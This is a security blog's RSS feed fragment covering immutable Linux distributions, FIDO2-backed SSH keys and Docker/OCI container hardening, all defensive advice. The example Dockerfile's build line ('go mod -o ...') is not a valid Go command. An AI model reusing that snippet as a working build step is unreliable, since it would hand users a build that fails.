+<p><a href="https://silverblue.fedoraproject.org/">Fedora Silverblue</a> and <a href="https://kinoite.fedoraproject.org/">Fedora Kinoite</a> are immutable variants of Fedora with a strong focus on container workflows. Silverblue comes with the <a href="https://www.gnome.org/">GNOME</a> desktop environment while Kinoite comes with <a href="https://kde.org/">KDE</a>. Silverblue and Kinoite follow the same release schedule as Fedora Workstation, benefiting from the same fast updates and staying very close to upstream.</p>
+<p>You can refer to the video by <a href="https://twitter.com/adsamalik">Adam Šamalík</a> linked <a href="#traditional-and-atomic-updates">above</a> on how these distributions work.</p>
+<h3 id="opensuse-tumbleweed-and-microos">openSUSE Tumbleweed and MicroOS</h3>
+<p>Fedora Workstation and Silverblue&rsquo;s European counterpart. These are rolling release, fast updating distributions with <a href="https://kubic.opensuse.org/blog/2018-04-04-transactionalupdates/">transactional update</a> using <a href="https://en.wikipedia.org/wiki/Btrfs">Btrfs</a> and <a href="https://en.opensuse.org/openSUSE:Snapper_Tutorial">Snapper</a>.</p>
+<p><a href="https://microos.opensuse.org/">MicroOS</a> has a much smaller base system than <a href="https://get.opensuse.org/tumbleweed">Tumbleweed</a> and mounts the running BTRFS subvomumes as read-only (hence its name and why it is considered an immutable distribution). Currently, it is still in Beta so bugs are to be expected. Nevertheless, it is an awesome project.</p>
+<div class="youtube-embed-div">
+    <iframe src="https://www.youtube-nocookie.com/embed/jcl_4Vh6qP4" class="youtube-embed-frame" allowfullscreen title="YouTube Video"></iframe>
+</div>  
+<h3 id="whonix">Whonix</h3>
+<p><a href="https://www.whonix.org/">Whonix</a> is a distribution focused on anonymity based on <a href="https://www.whonix.org/wiki/Kicksecure">Kicksecure</a>. It is meant to run as two virtual machines: a “Workstation” and a Tor “Gateway.” All communications from the Workstation must go through the Tor gateway. This means that even if the Workstation is compromised by malware of some kind, the true IP address remains hidden. It is currently the best solution that I know of if your threat model requires anonymity.</p>
+<p>Some of its features include Tor Stream Isolation, <a href="https://www.whonix.org/wiki/Keystroke_Deanonymization#Kloak">keystroke anonymization</a>, <a href="https://www.kicksecure.com/wiki/Boot_Clock_Randomization">boot clock ranomization</a>, <a href="https://github.com/Whonix/swap-file-creator">encrypted swap</a>, hardened boot parameters, hardened kernel settings, and a <a href="https://www.kicksecure.com/wiki/Hardened_Malloc">hardened memory allocator</a>. One downside of Whonix is that it still inherits outdated packages with lots of downstream patching from Debian.</p>
+<p>Future versions of Whonix will likely include <a href="https://github.com/Whonix/apparmor-profile-everything">full system AppArmor policies</a> and a <a href="https://www.whonix.org/wiki/Sandbox-app-launcher">sandbox app launcher</a> to fully confine all processes on the system.</p>
+<p>Although Whonix is best used <a href="https://www.whonix.org/wiki/Qubes/Why_use_Qubes_over_other_Virtualizers">in conjunction with Qubes</a>, Qubes-Whonix has <a href="https://forums.whonix.org/t/qubes-whonix-security-disadvantages-help-wanted/8581">various disadvantages</a> when compared to other hypervisors.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Securing OpenSSH with FIDO2</title>
+      <link>https://loudrxiv.github.io/posts/linux/securing-openssh-with-fido2/</link>
+      <pubDate>Sat, 09 Apr 2022 17:43:12 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/securing-openssh-with-fido2/</guid>
+      <description>Passwordless authentication with OpenSSH keys has been the de facto security standard for years. SSH keys are more robust since they&amp;rsquo;re cryptographically sane by default, and are therefore resilient to most bruteforce atacks. They&amp;rsquo;re also easier to manage while enabling a form of decentralized authentication (it&amp;rsquo;s easy and painless to revoke them). So, what&amp;rsquo;s the next step? And more exactly, why would one need something even better?
+Why? The main problem with SSH keys is that they&amp;rsquo;re not magic: they consist of a key pair, of which the private key is stored on your disk.</description>
+      <content:encoded><![CDATA[<p>Passwordless authentication with OpenSSH keys has been the <em>de facto</em> security standard for years. SSH keys are more robust since they&rsquo;re cryptographically sane by default, and are therefore resilient to most bruteforce atacks. They&rsquo;re also easier to manage while enabling a form of decentralized authentication (it&rsquo;s easy and painless to revoke them). So, what&rsquo;s the next step? And more exactly, why would one need something even better?</p>
+<h2 id="why">Why?</h2>
+<p>The main problem with SSH keys is that they&rsquo;re not magic: they consist of a key pair, of which the private key is stored on your disk. You should be wary of various exfiltration attempts, depending on your theat model:</p>
+<ul>
+<li>If your disk is not encrypted, any physical access could compromise your keys.</li>
+<li>If your private key isn&rsquo;t encrypted, malicious applications could compromise it.</li>
+<li>Even with both encrypted, malicious applications could register your keystrokes.</li>
+</ul>
+<p>All these attempts are particularly a thing on desktop platforms, because they don&rsquo;t have a proper sandboxing model. On Windows, non-UWP apps could likely have full access to your <code>.ssh</code> directory. On desktop Linux distributions, sandboxing is also lacking, and the situation is even worse if you&rsquo;re using X.org since it allows apps to spy on each other (and on your keyboard) by design. A first good step would be to only use SSH from a trusted &amp; decently secure system.</p>
+<p>Another layer of defense would obviously be multi-factor authentication, or the fact that you&rsquo;re relying on a shared secret instead. We can use FIDO2 security keys for that. That way, even if your private key is compromised, the attacker needs physical access to your security key. TOTP is another common 2FA technique, but it&rsquo;s vulnerable to various attacks, and relies on the quality of the implementation on the server.</p>
+<h2 id="how">How?</h2>
+<p>Fortunately for us, <a href="https://www.openssh.com/txt/release-8.2">OpenSSH 8.2</a> (released in February 2020) introduced native support for FIDO2/U2F. Most OpenSSH distributions should have the middleware set to use the <code>libfido2</code> library, including portable versions such as the one <a href="https://github.com/PowerShell/Win32-OpenSSH">for Win32</a>.</p>
+<p>Basically, <code>ssh-keygen -t ${key_type}-sk</code> will generate for us a token-backed key pair. The key types that are supported depend on your security key. Newer models should support both ECDSA-P256 (<code>ecdsa-sk</code>) and Ed25519 (<code>ed25519-sk</code>). If the latter is available, you should prefer it.</p>
+<h3 id="client-configuration">Client configuration</h3>
+<p>To get started:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-keygen -t ed25519-sk
+</span></span></code></pre></div><p>This will generate a <code>id_ed25519_sk</code> private key and a <code>id_ed25519_sk.pub</code> public key in <code>.ssh</code>. These are defaults, but you can change them if you want. We will call this key pair a &ldquo;handle&rdquo;, because they&rsquo;re not sufficient by themselves to derive the real secret (as you guessed it, the FIDO2 token is needed). <code>ssh-keygen</code> should ask you to touch the key, and enter the PIN prior to that if you did set one (you probably should).</p>
+<p>You can also generate a <strong>resident key</strong> (referred to as <em>discoverable credential</em> in the WebAuthn specification):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-keygen -t ed25519-sk -O resident -O application=ssh:user1
+</span></span></code></pre></div><p>As you can see, a few options must be specified:</p>
+<ul>
+<li><code>-O resident</code> will tell <code>ssh-keygen</code> to generate a resident key, meaning that the private &ldquo;handle&rdquo; key will also be stored on the security key itself. This has security implications, but you may want that to move seamlessly between different computers. In that case, you should absolutely protect your key with a PIN beforehand.</li>
+<li><code>-O application=ssh:</code> is necessary to instruct that the resident key will use a particular slot, because the security key will have to index the resident keys (by default, they use <code>ssh:</code> with an empty user ID). If this is not specified, the next key generation might overwrite the previous one.</li>
+<li><code>-O verify-required</code> is optional but instructs that a PIN is required to generate/access the key.</li>
+</ul>
+<p>Resident keys can be retrieved using <code>ssh-keygen -K</code> or <code>ssh-add -K</code> if you don&rsquo;t want to write them to the disk.</p>
+<h3 id="server-configuration">Server configuration</h3>
+<p>Next, transfer your public key over to the server (granted you have already access to it with a regular key pair):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-copy-id -i ~/.ssh/id_ed25519_sk.pub user@server.domain.tld
+</span></span></code></pre></div><p><em>Ta-da!</em> But one last thing: we need to make sure the server supports this public key format in <code>sshd_config</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PubkeyAcceptedKeyTypes ssh-ed25519,sk-ssh-ed25519@openssh.com
+</span></span></code></pre></div><p>Adding <code>sk-ssh-ed25519@openssh.com</code> to <code>PubkeyAcceptedKeyTypes</code> should suffice. It&rsquo;s best practice to only use the cryptographic primitives that you need, and hopefully ones that are also modern. This isn&rsquo;t a full-on SSH hardening guide, but you should take a look at the <a href="https://github.com/GrapheneOS/infrastructure/blob/main/sshd_config">configuration file GrapheneOS uses</a> for their servers to give you an idea on a few good practices.</p>
+<p>Restart the <code>sshd</code> service and try to connect to your server using your key handle (by passing <code>-i ~/.ssh/id_ed25519_sk</code> to <code>ssh</code> for instance). If that works for you (your FIDO2 security key should be needed to derive the real secret), feel free to remove your previous keys from <code>.ssh/authorized_keys</code> on your server.</p>
+<h2 id="thats-cool-right">That&rsquo;s cool, right?</h2>
+<p>If you don&rsquo;t have a security key, you can buy one from <a href="https://www.yubico.com/fr/store/">YubiKey</a> (I&rsquo;m very happy with my 5C NFC by the way), <a href="https://www.nitrokey.com/">Nitrokey</a>, <a href="https://solokeys.com/">SoloKeys</a> or <a href="https://onlykey.io/">OnlyKey</a> (to name a few). If you have an Android device with a hardware security module (HSM), such as the Google Pixels equipped with Titan M (Pixel 3+), you could even use them as bluetooth security keys.</p>
+<p><em>No reason to miss out on the party if you can afford it!</em></p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Docker and OCI Hardening</title>
+      <link>https://loudrxiv.github.io/posts/linux/docker-and-oci-hardening/</link>
+      <pubDate>Wed, 30 Mar 2022 21:23:12 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/docker-and-oci-hardening/</guid>
+      <description>Containers aren&amp;rsquo;t that new fancy thing anymore, but they were a big deal. And they still are. They are a concrete solution to the following problem:
+- Hey, your software doesn&amp;rsquo;t work&amp;hellip;
+- Sorry, it works on my computer! Can&amp;rsquo;t help you.
+Whether we like them or not, containers are here to stay. Their expressiveness and semantics allow for an abstraction of the OS dependencies that a software has, the latter being often dynamically linked against certain libraries.</description>
+      <content:encoded><![CDATA[<p>Containers aren&rsquo;t that new fancy thing anymore, but they were a big deal. And they still are. They are a concrete solution to the following problem:</p>
+<blockquote>
+<p>- Hey, your software doesn&rsquo;t work&hellip;</p>
+<p>- Sorry, it works on my computer! Can&rsquo;t help you.</p>
+</blockquote>
+<p>Whether we like them or not, containers are here to stay. Their expressiveness and semantics allow for an abstraction of the OS dependencies that a software has, the latter being often dynamically linked against certain libraries. The developer can therefore provide a known-good environment where it is expected that their software &ldquo;just works&rdquo;. That is particularly useful for development to eliminate environment-related issues, and that is often used in production as well.</p>
+<p>Containers are often perceived as a great tool for isolation, that is, they can provide an isolated workspace that won&rsquo;t pollute your host OS - all that without the overhead of virtual machines. Security-wise: containers, as we know them on Linux, are glorified namespaces at their core. Containers usually share the same kernel with the host, and <strong>namespaces</strong> is the kernel feature for separating kernel resources across containers (IDs, networks, filesystems, IPC, etc.). Containers also leverage the features of <strong>cgroups</strong> to separate system resources (CPU, memory, etc.), and security features such as seccomp to restrict syscalls, or MACs (AppArmor, SELinux).</p>
+<p>At first, it seems that containers may not provide the same isolation boundary as virtual machines. That&rsquo;s fine, they were not designed to. But they can&rsquo;t be simplified to a simple <code>chroot</code> either. We&rsquo;ll see that a &ldquo;container&rdquo; can mean a lot of things, and their definition may vary a lot depending on the implementation: as such, containers are mostly defined by their semantics.</p>
+<h2 id="docker-is-dead-long-live-docker-and-oci">Docker is dead, long live Docker&hellip; and OCI!</h2>
+<p>When people think of containers, a large group of them may think of Docker. While Docker played a big role in the popularity of containers a few years ago, it didn&rsquo;t introduce the technology: on Linux, LXC did (<em>Linux Containers</em>). In fact, Docker in its early days was a high-level wrapper for LXC which already combined the power of namespaces and cgroups. Docker then replaced LXC with <code>libcontainer</code> which does more or less the same, plus extra features.</p>
+<p>Then, what happened? <em>Open Container Initiative</em> (OCI). That is the current standard that defines the container ecosystem. That means that whether you&rsquo;re using Docker, Podman, or Kubernetes, you&rsquo;re in fact running OCI-compliant tools. That is a good thing, as it saves a lot of interoperability headaches.</p>
+<p><strong>Docker</strong> is no longer the monolithic platform it once was. <code>libcontainer</code> was absorbed by <code>runc</code>, the reference OCI runtime. The high-level components of Docker split into different parts related to the upstream Moby project (Docker is the &ldquo;assembled product&rdquo; of the &ldquo;Moby components&rdquo;). When we refer to Docker, we refer in fact at this powerful high-level API that manages OCI containers. By design, Docker is a daemon that communicates with <code>containerd</code>, a lower-level layer, which in turn communicates with the OCI runtime. That also means that you could very well skip Docker altogether and use <code>containerd</code> or even <code>runc</code> directly.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Docker client &lt;=&gt; Docker daemon &lt;=&gt; containerd &lt;=&gt; containerd-shim &lt;=&gt; runc
+</span></span></code></pre></div><p><strong>Podman</strong> is an alternative to Docker developed by RedHat, that also intends to be a drop-in replacement for Docker. It doesn&rsquo;t work with a daemon, and can work rootless by design (Docker has support for rootless too, but that is not without caveats). I would largely recommend Podman over Docker for someone who wants a simple tool to run containers and test code on their machine.</p>
+<p><strong>Kubernetes</strong> (also known as K8S) is the container platform made by Google. It is designed with scaling in mind, and is about running containers across a cluster whereas Docker focuses on packaging containers on a single node. Docker Swarm is the direct alternative to that, but it has never really took off due to the popularity of K8S.</p>
+<p>For the rest of this article, we will use Docker as the reference for our examples, along with the <a href="https://docs.docker.com/compose/compose-file/">Compose specification</a> format. Most of these examples can be adapted to other platforms without issues.</p>
+<h2 id="the-nightmare-of-dependencies">The nightmare of dependencies</h2>
+<p>Containers are made from images, and images are typically built from a Dockerfile. Images can be built and distributed through OCI registries: <a href="https://hub.docker.com/">Docker Hub</a>, <a href="https://cloud.google.com/container-registry">Google Container Registry</a>, <a href="https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry">GitHub Container Registry</a>, and so on. You can also set up your own private registry as well, but the reality is that people often pull images from these public registries.</p>
+<h3 id="images-immutability-and-versioning">Images, immutability and versioning</h3>
+<p>Images are what make containers, well, containers. Containers made from the same image should behave similarly on different machines. Images can have <strong>tags</strong>, which are useful for software versioning. The usage of generic tags such as <code>latest</code> is often discouraged because it defeats the purpose of the expected behavior of the container. Tags are not necessarily immutable by design, and they shouldn&rsquo;t be (more on that below). <strong>Digest</strong>, however, is the attribute of an immutable image, and is often generated with the SHA-256 algorithm.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker.io/library/golang:1.17.1@sha256:232a180dbcbcfa7250917507f3827d88a9ae89bb1cdd8fe3ac4db7b764ebb25
+</span></span><span class="line"><span class="cl">         ^          ^       ^                                   ^ 
+</span></span><span class="line"><span class="cl">         |          |       |                                   |
+</span></span><span class="line"><span class="cl">     Registry     Image    Tag                          Digest (immutable)
+</span></span></code></pre></div><p>Now onto why tags shouldn&rsquo;t be immutable: as written above, containers bring us an abstraction over the OS dependencies that are used by the packaged software. That is nice indeed, but this shouldn&rsquo;t lure us into believing that we can forget security updates. The fact is, <strong>there is still a whole OS to care about</strong>, and we can&rsquo;t just think of the container as a simple package tool for software.</p>
+<p>For these reasons, good practices were established:</p>
+<ul>
+<li>An image should be as minimal as possible (Alpine Linux, or scratch/distroless).</li>
+<li>An image, with a given tag, should be regularly built, without cache to ensure all layers are freshly built.</li>
+<li>An image should be rebuilt when the images it&rsquo;s based on are updated.</li>
+</ul>
+<h3 id="a-minimal-base-system">A minimal base system</h3>
+<p><a href="https://alpinelinux.org/">Alpine Linux</a> is often the choice for official images for the first reason. This is not a typical Linux distribution as it uses musl as its C library, but it works quite well. Actually, I&rsquo;m quite fond of Alpine Linux and <code>apk</code> (its package manager). If a supervision suite is needed, I&rsquo;d look into <code>s6</code>. If you need a glibc distribution, Debian provides slim variants for lightweight base images. We can do even better than using Alpine by using <strong>distroless images</strong>, allowing us to have state-of-the-art application containers.</p>
+<p>&ldquo;Distroless&rdquo; is a fancy name referring to an image with a minimal set of dependencies, from none (for fully static binaries) to some common libraries (typically the C library). Google maintains <a href="https://github.com/GoogleContainerTools/distroless">distroless images</a> you can use as a base for your own images. If you were wondering, the difference with <code>scratch</code> (empty starting point) is that distroless images contain common dependencies that &ldquo;almost-statically compiled&rdquo; binaries may need, such as <code>ca-certificates</code>.</p>
+<p>However, distroless images are not suited for every application. In my experience though, distroless is an excellent option with pure Go binaries. Going with minimal images drastically reduces the available attack surface in the container. For example, here&rsquo;s a <a href="https://docs.docker.com/develop/develop-images/multistage-build/">multi-stage Dockerfile</a> resulting in a minimal non-root image for a simple Go project:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> golang:alpine as build</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /app</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> . .<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">0</span> go mod -o /my_app cmd/my_app<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> gcr.io/distroless/static</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> --from<span class="o">=</span>build /my_app /<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">USER</span><span class="s"> nobody</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENTRYPOINT</span> <span class="p">[</span><span class="s2">&#34;/my_app&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><p>The main drawback of using minimal images is the lack of tools that help with debugging, which also constitute the very attack surface we&rsquo;re trying to get rid of. The trade-off is probably not worth the hassle for development-focused containers, and if you&rsquo;re running such images in production, you have to be confident enough to operate with them. Note that the <code>gcr.io/distroless</code> images have a <code>:debug</code> tag to help in that regard.</p>
+<h3 id="keeping-images-up-to-date">Keeping images up-to-date</h3>
+<p>The two other points are highly problematic, because most software vendors just publish an image on release, and forget about it. You should take it up to them if you&rsquo;re running images that are versioned but not regularly updated. I&rsquo;d say running scheduled builds <strong>once a week</strong> is the bare minimum to make sure dependencies stay up-to-date. Alpine Linux is a better choice than most other &ldquo;stable&rdquo; distributions because it usually has more recent packages.</p>
+<p>Stable distributions often rely on backporting security fixes from CVEs, which is known to be a flawed approach to security since CVEs aren&rsquo;t always assigned or even taken care of. Alpine has more recent packages, and it has versioning, so it&rsquo;s once again a particularly good choice as long as <code>musl</code> doesn&rsquo;t cause issues.</p>
+<h3 id="is-it-really-a-security-nightmare">Is it really a security nightmare?</h3>
+<p>When people say Docker is a security nightmare because of that, that&rsquo;s a fair point. On a traditional system, you could upgrade your whole system with a single command or two. With Docker, you&rsquo;ll have to recreate several containers&hellip; if the images were kept up-to-date in the first place. Recreating itself is not a big deal actually: hot upgrades of binaries and libraries often require the services that use them to restart, otherwise they could still use an old (and vulnerable) version of them in memory. But yeah, the fact is most people are running outdated containers, and more often than not, they don&rsquo;t have the choice if they rely on third-party images.</p>
+<p><a href="https://github.com/aquasecurity/trivy">Trivy</a> is an excellent tool to scan images for a subset of <strong>known vulnerabilities</strong> an image might have. You should play with it and see for yourself how outdated many publicly available images are.</p>
+<h3 id="supply-chain-attacks">Supply-chain attacks</h3>
+<p>As with any code downloaded from a software vendor, OCI images are not exempt from supply-chain attacks. The good practice is quite simple: rely on official images, and ideally build and maintain your own images. One should definitely not automatically trust random third-party images they can find on Docker Hub. Half of these images, if not more, contain vulnerabilities, and I bet a good portion of them contains malwares <a href="https://www.trendmicro.com/vinfo/fr/security/news/virtualization-and-cloud/malicious-docker-hub-container-images-cryptocurrency-mining">such as miners</a> or worse.</p>
+<p>As an image maintainer, you can sign your images to improve the authenticity assurance. Most official images make use of <a href="https://docs.docker.com/engine/security/trust/">Docker Content Trust</a>, which works with a OCI registry attached to a <a href="https://github.com/notaryproject/notary">Notary server</a>. With the Docker toolset, setting the environment variable <code>DOCKER_CONTENT_TRUST=1</code> enforces signature verification (a signature is only good if it&rsquo;s checked in the first place). The SigStore initiative is developing <a href="https://github.com/sigstore/cosign">cosign</a>, an alternative that doesn&rsquo;t require a Notary server because it works with features already provided by the registry such as tags. Kubernetes users may be interested in <a href="https://github.com/sse-secure-systems/connaisseur">Connaisseur</a> to ensure all signatures have been validated.</p>
+<h2 id="leave-my-root-alone">Leave my root alone!</h2>
+<h3 id="attack-surface">Attack surface</h3>
+<p>Traditionally, Docker runs as a daemon owned by root. That also means that root in the container is actually the root on the host and may be a few commands away from compromising the host. More generally, the attacker has to exploit the available attack surface to escape the container. There is a huge attack surface, actually: the Linux kernel. <a href="https://grsecurity.net/huawei_hksp_introduces_trivially_exploitable_vulnerability">Someone wise once said</a>:</p>
+<blockquote>
+<p>The kernel can effectively be thought of as the largest, most vulnerable setuid root binary on the system.</p>
+</blockquote>
+<p>That applies particularly to traditional containers which weren&rsquo;t designed to provide a robust level of isolation. A recent example was <a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/">CVE-2022-0492</a>: the attacker could abuse root in the container to exploit cgroups v1, and compromise the host. Of course defense-in-depth measures would have prevented that, and we&rsquo;ll mention them. But fundamentally, container escapes are possible by design.</p>
+<p>Breaking out via the OCI runtime <code>runc</code> is also possible, although <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a> was a particularly nasty bug. The attacker had to gain access to root in the container first in order to access <code>/proc/[runc-pid]/exe</code>, which indicates them where to overwrite the <code>runc</code> binary.</p>
+<p>Good practices have been therefore established:</p>
+<ul>
+<li>Avoid using root in the container, plain and simple.</li>
+<li>Keep the host kernel, Docker and the OCI runtime updated.</li>
+<li>Consider the usage of user namespaces.</li>
+</ul>
+<p>By the way, it goes without saying that any user who has access to the Docker daemon should be considered as privileged as root. Mounting the Docker socket (<code>/var/run/docker.sock</code>) in a container makes it highly privileged, and so it should be avoided. The socket should only be owned by root, and if that doesn&rsquo;t work with your environment, use Docker rootless or Podman.</p>
+<h3 id="avoiding-root">Avoiding root</h3>
+<p>root can be avoided in different ways in the final container:</p>
+<ul>
+<li>Image creation time: setting the <code>USER</code> instruction in the Dockerfile.</li>
+<li>Container creation time: via the tools available (<code>user:</code> in the Compose file).</li>
+<li>Container runtime: degrading privileges with entrypoints scripts (<code>gosu UID:GID</code>).</li>
+</ul>
+<p>Well-made images with security in mind will have a <code>USER</code> instruction. In my experience, most people will run images blindly, so it&rsquo;s good harm reduction. Setting the user manually works in some images that aren&rsquo;t designed without root in mind, and it&rsquo;s also great to mitigate some <em>scenarii</em> where the image is controlled by an attacker. You also won&rsquo;t have surprises when mounting volumes, so I highly recommend setting the user explicitly and make sure volume permissions are correct once.</p>
+<p>Some images allow users to define their own user with UID/GID environment variables, with an entrypoint script that runs as root and takes care of the volume permissions before dropping privileges. While technically fine, it is still attack surface, and it requires the <code>SETUID</code>/<code>SETGID</code> capabilities to be available in the container.</p>
+<h3 id="user-namespaces-sandbox-or-paradox">User namespaces: sandbox or paradox?</h3>
+<p>As mentioned just above, <a href="https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html">user namespaces</a> are a solution to ensure root in the container is not root on the host. Docker supports user namespaces, for instance you could set the default mapping in <code>/etc/docker/daemon.json</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    &#34;userns-remap&#34;: &#34;default&#34;
+</span></span></code></pre></div><p><code>whoami &amp;&amp; sleep 60</code> in the container will return root, but <code>ps -fC sleep</code> on the host will show us the PID of another user. That is nice, but it has limitations and therefore shouldn&rsquo;t be considered as a real sandbox. In fact, the paradox is that <a href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html">user namespaces are attack surface</a> (and vulnerabilities are still being found <a href="https://www.openwall.com/lists/oss-security/2022/01/29/1">years later</a>), and it&rsquo;s common wisdom to restrict them to privileged users (<code>kernel.unprivileged_userns_clone=0</code>). That is fine for Docker with its traditional root daemon, but Podman expects you to let unprivileged users interact with user namespaces (so essentially privileged code).</p>
+<p>Enabling <code>userns-remap</code> in Docker shouldn&rsquo;t be a substitute for running unprivileged application containers (where applicable). User namespaces are mostly useful if you intend to run full-fledged OS containers which need root in order to function, but that is out of the scope of the container technologies mentioned in this article; for them, I&rsquo;d argue exposing such a vulnerable attack surface from the host kernel for dubious sandboxing benefits isn&rsquo;t an interesting trade-off to make.</p>
+<h3 id="the-no_new_privs-bit">The no_new_privs bit</h3>
+<p>After ensuring root isn&rsquo;t used in your containers, you should look into setting the <code>no_new_privs</code> bit. <a href="https://docs.kernel.org/userspace-api/no_new_privs.html">This Linux feature</a> restricts syscalls such as <code>execve()</code> from granting privileges, which is what you want to restrict in-container privilege escalation. This flag can be set for a given container in a Compose file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    security_opt:
+</span></span><span class="line"><span class="cl">        - no-new-privileges: true
+</span></span></code></pre></div><p>Gaining privileges in the container will be much harder that way.</p>
+<h3 id="capabilities">Capabilities</h3>
+<p>Furthermore, we should mention capabilities: root powers are divided into distinct units by the Linux kernel, called capabilities. Each granted capability also grants privilege and therefore access to a significant amount of attack surface. Security researcher Brad Spengler enumerates <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522#p10271">19 important capabilities</a>. Docker <strong>restricts certain capabilities by default</strong>, but <a href="https://github.com/moby/moby/blob/1308a3a99faa13ff279dcb4eb5ad23aee3ab5cdb/oci/caps/defaults.go">some of the most important ones</a> are still available to a container by default.</p>
+<p>You should consider the following rule of thumb:</p>
+<ul>
+<li>Drop all capabilities by default.</li>
+<li>Allow only the ones you really need to.</li>
+</ul>
+<p>If you already run your containers unprivileged without root, your container will very likely work fine with all capabilities dropped. That can be done in a Compose file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    cap_drop:
+</span></span><span class="line"><span class="cl">        - ALL
+</span></span><span class="line"><span class="cl">    #cap_add:
+</span></span><span class="line"><span class="cl">    #  - CHOWN
+</span></span><span class="line"><span class="cl">    #  - DAC_READ_SEARCH
+</span></span><span class="line"><span class="cl">    #  - SETUID
+</span></span><span class="line"><span class="cl">    #  - SETGID
+</span></span></code></pre></div><p>Never use the <code>--privileged</code> option unless you really need to: a privileged container is given access to almost all capabilities, kernel features and devices.</p>
+<h2 id="other-security-features">Other security features</h2>
+<p>MACs and seccomp are robust tools that may vastly improve container security.</p>
+<h3 id="mandatory-access-control">Mandatory Access Control</h3>
+<p>MAC stand for Mandatory Access Control: traditionally a Linux Security Module that will enforce a policy to restrict the userspace. Examples are <strong>AppArmor</strong> and <strong>SELinux</strong>: the former being more easy-to-use, the later being more fine-grained. Both are strong tools that can help&hellip; Yet, their sole presence does not mean they&rsquo;re really effective. A robust policy starts from a <em>deny all</em> policy, and only allows the necessary resources to be accessed.</p>
+<h3 id="seccomp">seccomp</h3>
+<p>seccomp (short for secure computing mode) on the other hand is a much simpler and complementary tool, and there is no reason not to use it. What it does is restricting a process to a set of system calls, thus drastically reducing the attack surface available.</p>
+<p>Docker provides default profiles for <a href="https://github.com/moby/moby/tree/85eaf23bf46b12827273ab2ff523c753117dbdc7/profiles/apparmor">AppArmor</a> and <a href="https://github.com/moby/moby/blob/85eaf23bf46b12827273ab2ff523c753117dbdc7/profiles/seccomp/default.json">seccomp</a>, and they&rsquo;re enabled by default for newly created containers unless the <code>unconfined</code> option is explicitly passed. Note: Kubernetes doesn&rsquo;t enable the default seccomp profile by default, so you should probably <a href="https://kubernetes.io/docs/tutorials/security/seccomp/#enable-the-use-of-runtimedefault-as-the-default-seccomp-profile-for-all-workloads">try it</a>.</p>
+<p>These profiles are a great start, but you should do much more if you take security seriously, because they were made to not break compatibility with a large range of images. The default seccomp profile only disables <a href="https://docs.docker.com/engine/security/seccomp/#significant-syscalls-blocked-by-the-default-profile">around 44 syscalls</a>, which are mostly not very common and/or obsoleted. Of course, the best profile you can get is supposed to be written for a given program. It also doesn&rsquo;t make sense to insist on the permissiveness of the default profiles, and <a href="https://blog.jessfraz.com/post/containers-security-and-echo-chambers/">a lof of work has gone</a> into hardening containers.</p>
+<h3 id="cgroups">cgroups</h3>
+<p>Use cgroups to restrict access to hardware and system resources. You likely don&rsquo;t want a guest container to monopolize the host resources. You also don&rsquo;t want to be vulnerable to stupid fork bomb attacks. In a Compose file, consider setting these limits:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    mem_limit: 4g
+</span></span><span class="line"><span class="cl">    cpus: 4
+</span></span><span class="line"><span class="cl">    pids_limit: 256
+</span></span></code></pre></div><p>More runtime options can be found in <a href="https://docs.docker.com/config/containers/resource_constraints/">the official documentation</a>. All of them should have a <a href="https://github.com/compose-spec/compose-spec/blob/master/spec.md">Compose spec</a> equivalent.</p>
+<p>The <code>--cgroup-parent</code> option should be avoided as it uses the host cgroup and not the one configured from Docker (or else), which is the default.</p>
+<h3 id="read-only-filesystem">Read-only filesystem</h3>
+<p>It is good practice to treat the image as some refer to as the &ldquo;golden image&rdquo;.</p>
+<p>In other words, you&rsquo;ll run containers in <em>read-only</em> mode, with an immutable filesystem inherited from the image. Only the mounted volumes will be read/write accessible, and those should ideally be mounted with the <code>noexec</code>, <code>nosuid</code> and <code>nodev</code> options for extra security. If read/write access isn&rsquo;t needed, mount these volumes as read-only too.</p>
